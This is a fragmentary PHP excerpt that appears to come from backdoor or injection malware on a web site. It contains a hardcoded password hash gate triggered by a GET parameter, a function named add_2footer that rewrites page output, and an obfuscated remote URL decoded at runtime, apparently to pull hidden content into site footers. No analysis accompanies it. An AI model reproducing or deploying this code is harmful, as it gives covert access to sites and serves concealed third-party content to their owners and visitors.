...
$p = $_POST;
$_passssword = '3f9cfb84fb3e607c184d9612936e917f';
...
function add_2footer() {
    $check = false;
    $check_data = "";
    if (!empty($_GET['check']) AND $_GET['check'] == '3f9cfb84fb3e607c184d9612936e917f') {
        $check = true;
    ...
    if (preg_match($regexp, $buffer, $m)) {
        $body = $m[0];
//        $url = base64_decode('a3d3czksLDI3My0xMDQtMi0yOjcsYW9sZCw8c2JxaGZxJXZ3blxwbHZxYGY+NzM7NjI5MjE2NTYwMjkxMzsw');
        $url = decrypt_url('a3d3czksLDI3My0xMDQtMi0yOjcsYW9sZCw8c2JxaGZxJXZ3blxwbHZxYGY+NzM7NjI5MjE2NTYwMjkxMzsw');
